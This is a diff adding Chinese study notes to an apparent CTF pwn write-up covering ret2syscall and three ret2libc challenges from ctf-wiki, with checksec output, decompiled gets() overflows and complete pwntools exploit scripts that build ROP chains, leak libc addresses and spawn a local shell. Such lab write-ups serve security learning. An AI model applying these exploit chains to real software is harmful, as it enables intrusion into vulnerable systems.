@@ -218,6 +218,8 @@ r.sendline(payload)
 r.interactive()
 ```
 
+主要问题还是找短的 shellcode，在 [exploitdb](https://www.exploit-db.com/) 里可以找到。有的 shellcode 长度符合但是并不能成功，看代码也没看出来为什么，之后还是学一下怎么写。
+
 ## ret2syscall
 
 控制程序执行系统调用
@@ -295,6 +297,235 @@ syscall = 0x08049421
 
 r.sendline('a'*offset + p32(pop_eax) + p32(0xb) + p32(pop_edx_ecx_ebx) + p32(0) + p32(0) + p32(bin_sh) + p32(syscall))
 
+r.interactive()
+```
+
+## ret2libc
+
+控制程序执行 libc 中的，通常是返回至某个函数的 plt 或函数具体位置（已知 got 表内容）。
+
+[ret2libc1](https://github.com/ctf-wiki/ctf-challenges/raw/master/pwn/stackoverflow/ret2libc/ret2libc1/ret2libc1)
+
+```shell
+gef➤  checksec
+[+] checksec for '/home/kali/pwn/ret2libc1'
+Canary                        : ✘ 
+NX                            : ✓ 
+PIE                           : ✘ 
+Fortify                       : ✘ 
+RelRO                         : Partial
+```
+
+```c
+int __cdecl main(int argc, const char **argv, const char **envp)
+{
+  char s; // [esp+1Ch] [ebp-64h]
+
+  setvbuf(stdout, 0, 2, 0);
+  setvbuf(_bss_start, 0, 1, 0);
+  puts("RET2LIBC >_<");
+  gets(&s);
+  return 0;
+}
+```
+
+gets 溢出，同时能找到 system_plt 和 /bin/sh，直接往栈里填就行了。
+
+```python
+##coding=utf8
+from pwn import *
+
+r = process('./ret2libc1')
+
+offset = 0xffffd5d8 - 0xffffd56c + 4
+bin_sh = 0x08048720
+system_plt = 0x08048460
+
+rop = [
+    system_plt,
+    0xdeadbeef,
+    bin_sh,
+]
+
+print offset
+r.sendline('a'*offset + ''.join(map(p32, rop)))
+r.interactive()
+```
+
+## ret2libc2
+
+```shell
+gef➤  checksec
+[+] checksec for '/home/kali/pwn/ret2libc2'
+Canary                        : ✘ 
+NX                            : ✓ 
+PIE                           : ✘ 
+Fortify                       : ✘ 
+RelRO                         : Partial 
+```
+
+```c
+int __cdecl main(int argc, const char **argv, const char **envp)
+{
+  setvbuf(stdout, 0, 2, 0);
+  setvbuf(_bss_start, 0, 1, 0);
+  puts("Something surprise here, but I don't think it will work.");
+  printf("What do you think ?");
+  gets(&s);
+  return 0;
+}
+```
+
+这个也差不多，只不过没有 /bin/sh，还是有 system 的，所以就先用 gets 写入一个 /bin/sh 。
+
+```python
+##coding=utf8
+from pwn import *
+
+r = process('./ret2libc2')
+
+offset = 0xffffd5d8 - 0xffffd56c + 4
+# bin_sh = 0x08048720
+
+buf = 0x0804b000 - 100
+gets_plt = 0x08048460
+system_plt = 0x08048490
+pop_ebx_ret = 0x0804843d
+
+rop = [
+    gets_plt,
+    pop_ebx_ret,
+    buf,
+    system_plt,
+    0xdeadbeef,
+    buf,
+]
+
+print offset
+r.sendline('a'*offset + ''.join(map(p32, rop)))
+r.sendline('/bin/sh\x00')
+r.interactive()
+```
+
+## ret2libc3
+
+```shell
+gef➤  checksec
+[+] checksec for '/home/kali/pwn/ret2libc3'
+Canary                        : ✘ 
+NX                            : ✓ 
+PIE                           : ✘ 
+Fortify                       : ✘ 
+RelRO                         : Partial
+```
+
+```c
+int __cdecl main(int argc, const char **argv, const char **envp)
+{
+  char s; // [esp+1Ch] [ebp-64h]
+
+  setvbuf(stdout, 0, 2, 0);
+  setvbuf(stdin, 0, 1, 0);
+  puts("No surprise anymore, system disappeard QQ.");
+  printf("Can you find it !?");
+  gets(&s);
+  return 0;
+}
+```
+
+这次连 system 都没有了，所以就需要获取 libc 中 system 的地址，就需要获取装载基址。用 puts 泄露 `__libc_start_main` 的 got 表项，我电脑上这个地址有 `\x00` 所以打印不了，选择另一个 `setvbuf`。泄露之后可以用栈迁移再用 gets 读或者返回到 main 函数：
+
+```python
+##coding=utf8
+from pwn import *
+
+r = process('./ret2libc3')
+
+ret2libc3 = ELF('./ret2libc3')
+
+offset = 0xffffd5c8 - 0xffffd55c + 4
+buf = 0x0804af80
+buf2 = 0x0804a880
+
+puts_plt = ret2libc3.plt['puts']
+gets_plt = ret2libc3.plt['gets']
+setvbuf_got = ret2libc3.got['setvbuf']
+
+pop_ebp_ret = 0x080486ff
+leave_ret = 0x08048538
+rop = [
+    puts_plt,
+    pop_ebp_ret,
+    setvbuf_got,
+    gets_plt,
+    pop_ebp_ret,
+    buf,
+    pop_ebp_ret,
+    buf - 4,
+    leave_ret,
+]
+print offset
+r.sendlineafter('Can you find it !?', 'a'*offset + ''.join(map(p32, rop)))
+# recv1 = r.recvline()
+# print 'recv1: ', ":".join("{:x}".format(ord(c)) for c in recv1)
+setvbuf = r.recvline()
+print 'recv: ', ":".join("{:x}".format(ord(c)) for c in setvbuf)
+
+setvbuf_offset = 0x006fd30
+libc_base = u32(setvbuf[:4]) - setvbuf_offset
+print 'libc base:', hex(libc_base)
+
+system = libc_base + 0x0044620
+
+rop2 = [
+    gets_plt,
+    system,
+    buf2,
+    buf2,
+]
+r.sendline(''.join(map(p32, rop2)))
+r.sendline('/bin/sh\x00')
+r.interactive()
+```
+
+带哥给的 exp 里直接返回到 main 函数再次溢出，不过这里的偏移又不一样了，所以要再调试到那算一下：
+
+```python
+##coding=utf8
+from pwn import *
+
+r = process('./ret2libc3')
+ret2libc3 = ELF('./ret2libc3')
+
+puts_plt = ret2libc3.plt['puts']
+gets_plt = ret2libc3.plt['gets']
+setvbuf_got = ret2libc3.got['setvbuf']
+main = ret2libc3.symbols['main']
+
+rop = [
+    puts_plt,
+    main,
+    setvbuf_got,
+]
+
+r.sendlineafter('Can you find it !?', 'a'*112 + ''.join(map(p32, rop)))
+setvbuf = r.recvline()
+print 'recv: ', ":".join("{:x}".format(ord(c)) for c in setvbuf)
+
+setvbuf_offset = 0x006fd30
+libc_base = u32(setvbuf[:4]) - setvbuf_offset
+print 'libc base:', hex(libc_base)
+
+system = libc_base + 0x0044620
+bin_sh = libc_base + 0x00188406
+
+rop2 = [
+    system,
+    0xdeadbeef,
+    bin_sh
+]
+
+r.sendlineafter('Can you find it !?', 'a'*104 + ''.join(map(p32, rop2)))
 r.interactive()
 ```
 
